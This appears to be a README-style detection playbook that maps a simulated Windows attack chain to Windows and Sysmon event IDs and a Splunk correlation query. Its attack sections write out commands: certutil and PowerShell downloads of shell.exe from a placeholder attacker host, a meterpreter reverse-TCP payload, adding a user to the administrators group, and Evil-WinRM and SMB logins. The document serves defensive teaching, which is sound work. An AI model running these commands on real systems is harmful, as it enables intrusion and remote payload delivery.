# 🛡️ Detection Engineering & Threat Hunting  
## 🔐 The Ultimate Windows Attack Lifecycle Master Playbook

![Platform](https://img.shields.io/badge/Platform-Windows-orange)
![SIEM](https://img.shields.io/badge/SIEM-Splunk-green)
![Telemetry](https://img.shields.io/badge/Telemetry-Sysmon-blue)
![Techniques](https://img.shields.io/badge/Techniques-Impacket%20%7C%20Metasploit%20%7C%20WinRM-red)
![Status](https://img.shields.io/badge/Detection-Operational-success)

---

## 📌 Executive Overview

This report documents a **forensic-level simulation of a modern Windows enterprise attack lifecycle**.

By bridging the gap between:

⚔️ Offensive Techniques  
- Impacket  
- Metasploit  
- Evil-WinRM  

🛡️ Defensive Monitoring  
- Splunk  
- Sysmon  
- Windows Security Logs  

We developed a **multi-layered detection framework** capable of identifying attackers across the full compromise lifecycle.

---

# 🧪 Full Attack Lifecycle Map
```
🔎 Recon → 🔑 Initial Access → 🧩 Persistence
↓
⬆ Privilege Escalation → 🔄 Lateral Movement
↓
📥 Tool Transfer → 🌐 Reverse Shell (C2)
↓
👑 Privilege Token Abuse
```

---
## ⚔️ Phase 1: Reconnaissance & Initial Access (SMB)

Attackers begin by **enumerating systems and validating credentials**.

---

## 💻 Attack Logic

🛠 Tool:

```
Impacket-SMBClient
```

Command:

```bash
impacket-smbclient <user>:<password>@<Target_IP>
```

📡 Protocol:
```
Server Message Block (SMB)
```

---
## 🔍 Detection Signatures
🪪 Event ID 4624 — Successful Logon
```
Logon Type 3 → Network Logon
```
- ✔ Remote authentication
- ✔ Credential validation

❌ Event ID 4625 — Failed Logon

- ⚠ Password spraying
- ⚠ Brute-force attempts

---
## ⚔️ Phase 2: Persistence & Privilege Escalation

Attackers ensure long-term access by modifying administrative privileges.

💻 Attack Logic

Command:
```
net localgroup administrators <username> /add
```
Executed via:
```
Impacket-PSExec (SYSTEM privileges)
```

---
## 🎯 Goal:

- ✔ Persistent administrator-level access

---
## 🔍 Detection Signatures

|🆔 Event ID	|📄 Description |
|-------------|----------------|
|4720	|👤 User account created |
|4732	|🛡️ Added to Administrators |

---
## 🚨 High-Fidelity Alert

Monitor execution of:
```
net.exe
net1.exe
```
Modifying:
```
Administrators group
```
- ⚠ Immediate SOC investigation recommended.

---
## ⚔️ Phase 3: Lateral Movement & Remote Execution

🔥 The Big Three: WMI, PSExec, WinRM

Once credentials are compromised, attackers pivot across systems.

- 💻 Attack Logic
- 🧰 WMIExec

Uses:
```
Windows Management Instrumentation (DCOM)
```
- ✔ Fileless execution
- ✔ Stealthy

---
## 🛠 PSExec

Creates:
```
Temporary SYSTEM-level service
```

## 🧠 Evil-WinRM (NEW)

Uses:
```
Windows Remote Management
Port: 5985 / 5986
```
Command:
```bash
evil-winrm -i 10.193.10.80 -u abhay -p Password
```
- ⚠ Often appears as legitimate administrative activity.

---
## 🔍 Detection Signatures

Monitor:
```
Event ID 4688
Sysmon Event ID 1
```

🔗 WMI Process Lineage
```
wmiprvse.exe → cmd.exe
wmiprvse.exe → powershell.exe
```

🔗 PSExec Process Lineage
```
services.exe → PSEXESVC.exe
```
Or:
```
services.exe → random_service_binary.exe
```

---
## 💎 WinRM Signature (Liquid Gold)
```
wsmprovhost.exe → cmd.exe
wsmprovhost.exe → powershell.exe
```
If this executes:
```
whoami
ipconfig
hostname
```
➡ Likely attacker-controlled WinRM session.

---
## ⚔️ Phase 4: Ingress Tool Transfer (LoLBins)

Attackers download payloads using trusted Windows binaries.

💻 Attack Logic

Payload:
```bash
shell.exe
```
Hosted using:
```bash
python3 -m http.server 80
```
📥 Download Methods
🧾 Certutil
```bash
certutil.exe -urlcache -split -f http://<Attacker_IP>/shell.exe shell.exe
```
⚡ PowerShell
```powershell
powershell iwr -uri http://<Attacker_IP>/shell.exe -outfile shell.exe
```

---
## 🔍 Detection Signatures

Monitor:
```
certutil.exe -urlcache
```
And:
```
Invoke-WebRequest
iwr
```

---
## ⚔️ Phase 5: Command & Control (C2)

🌐 Reverse Shell Detection
```
Payload execution establishes external attacker communication.
```
💻 Attack Logic

Payload:
```bash
windows/x64/meterpreter/reverse_tcp
```
Binary:
```
shell.exe
```
Connection:
```
Reverse TCP
```

---
## 🔍 Detection Signatures
🌐 Sysmon Event ID 3

Monitor:
```
Image: shell.exe
DestinationIp: <Attacker_IP>
DestinationPort: 4444, 8080, 443
```
🔗 Correlation Logic
```
Sysmon Event ID 3
        ↕
Event ID 4688
```
- ✔ Identifies execution origin
- ✔ Tracks outbound C2 traffic

---
## ⚔️ Phase 6: Privilege Token Analysis ("God Mode")

Attackers abuse SYSTEM privileges.

📂 Sensitive Privileges

Monitor:
```
Event ID 4672
Event ID 4673
```

---
## 🚨 Critical Privileges

|🔑 Privilege |	⚠ Risk |
|--------------|-----------|
|SeDebugPrivilege	|🧠 Memory access |
|SeTakeOwnershipPrivilege	|🔓 Full control |
|SeTcbPrivilege	|🛡️ OS-level authority |

Strong indicators of:

- ✔ Credential dumping
- ✔ SYSTEM compromise

---
## 📊 Universal Splunk Detection Logic

🧠 Unified Attack Timeline
```spl
index=* (EventCode IN (4688, 1, 4672, 4732, 3, 4624))

| eval User = coalesce(Account_Name, user, TargetUserName)

| eval Process = coalesce(New_Process_Name,
                          Image,
                          process_name)

| eval Parent = coalesce(Creator_Process_Name,
                         ParentImage,
                         ParentProcessName)

| eval Remote_IP = coalesce(DestinationIp,
                            Source_Network_Address,
                            ip)

| eval Activity = case(
    EventCode==4624, "🔑 Network Logon",
    EventCode==4732, "🛡️ Admin Group Modification",
    match(Parent, "(?i)wsmprovhost\\.exe"), "💎 Suspicious WinRM Execution",
    match(Parent, "(?i)wmiprvse\\.exe"), "🧰 Suspicious WMI Execution",
    EventCode==4688 OR EventCode==1, "⚙ Process Creation",
    EventCode==3, "🌐 External Network Callout",
    EventCode==4672, "👑 God-Mode Privilege Assigned"
)

| table _time,
         Activity,
         User,
         Process,
         Parent,
         Remote_IP,
         Privileges

| sort - _time

```

---
## 🏆 Final Architecture Summary

|⚔ Attack Phase	|🆔 Event ID	|🔍 Detection Signal	|🛡 Defense Layer |
|---------------|-------------|---------------------|-----------------|
|🔑 Initial Access	|4624	|Logon Type 3	|Identity Monitoring |
|🧩 Persistence	|4732	|Admin Group Change	|Host Configuration |
|🔄 Lateral Movement (WMI)	|4688	|wmiprvse → cmd.exe	|Process Monitoring |
|💎 Lateral Movement (WinRM)	|4688	|wsmprovhost → cmd.exe	|Process Monitoring |
|📥 Tool Transfer 	|Sysmon 1	|certutil -urlcache	|Application Control |
|🌐 C2 Callout	|Sysmon 3	|Outbound TCP	|Network Monitoring |
|👑 Privilege Escalation	|4672	|SeDebugPrivilege	|Behavioral Analytics |

---
## 🧠 Key Takeaway

- 🛡️ Attackers generate behavior chains, not isolated alerts.

Detection success depends on:

- ✔ Correlation
- ✔ Timeline visibility
- ✔ Process lineage
- ✔ Network telemetry

---
## 🚀 Future Expansion (Next Phases)

Planned advanced detections:

- 🧠 Credential Dumping Detection (Mimikatz)
- 🧬 LSASS Memory Access Monitoring
- 📅 Scheduled Task Persistence
- 📤 Data Exfiltration Detection
- 🌐 DNS Tunneling Detection

---
## ✍️ Author

Abhay

🔐 Detection Engineer
🧠 Threat Hunter
📊 SIEM Specialist

---
